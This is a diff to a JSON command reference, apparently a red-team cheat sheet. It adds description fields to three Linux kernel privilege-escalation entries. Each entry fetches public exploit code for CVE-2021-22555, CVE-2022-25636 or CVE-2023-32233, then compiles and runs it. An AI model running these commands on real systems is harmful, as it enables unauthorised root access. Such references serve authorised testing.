@@ -70,15 +70,18 @@
   "variations": [
     {
       "label": "CVE-2021-22555 (2.6 - 5.11)",
-      "command": "wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\ngcc -m32 -static exploit.c -o exploit\n./exploit"
+      "command": "wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\ngcc -m32 -static exploit.c -o exploit\n./exploit",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     },
     {
       "label": "CVE-2022-25636 (5.4 - 5.6.10)",
-      "command": "git clone https://github.com/Bonfee/CVE-2022-25636.git && cd CVE-2022-25636 && make\n./exploit"
+      "command": "git clone https://github.com/Bonfee/CVE-2022-25636.git && cd CVE-2022-25636 && make\n./exploit",
+      "description": "CVE-2022-25636 (5.4 - 5.6.10). See the command syntax for exact parameters and flags."
     },
     {
       "label": "CVE-2023-32233 (up to 6.3.1)",
-      "command": "git clone https://github.com/Liuk3r/CVE-2023-32233 && cd CVE-2023-32233\ngcc -Wall -o exploit exploit.c -lmnl -lnftnl\n./exploit"
+      "command": "git clone https://github.com/Liuk3r/CVE-2023-32233 && cd CVE-2023-32233\ngcc -Wall -o exploit exploit.c -lmnl -lnftnl\n./exploit",
+      "description": "CVE-2023-32233 (up to 6.3.1). See the command syntax for exact parameters and flags."
     }
   ],
   "opsec": "loud",
